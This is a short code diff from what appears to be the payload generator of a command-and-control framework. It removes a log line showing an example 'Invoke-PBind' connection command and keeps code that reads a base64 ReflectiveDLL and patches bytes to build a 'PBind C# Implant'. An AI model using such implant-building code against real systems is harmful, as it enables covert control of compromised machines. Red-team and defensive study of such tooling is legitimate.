@@ -255,7 +255,6 @@ class Payloads(object):
         # Load CLR "v4.0.30319"
         self.QuickstartLog("" + Colours.END)
         self.QuickstartLog("ReflectiveDLL that loads PBind C# Implant in CLR v4.0.30319 - DLL Export (VoidFunc)" + Colours.GREEN)
-        self.QuickstartLog("Invoke-PBind -Target 127.0.0.1 -Secret mtkn4 -Key %s -Pname jaccdpqnvbrrxlaf -Client" % (self.Key))
         with open('%sPosh_v4_x86_dll.b64' % FilesDirectory, 'r') as f:
             v4_86 = f.read()
         self.PatchPBindBytes("%sPBind_v4_x86.dll" % name, v4_86, 0x00012F80, "")
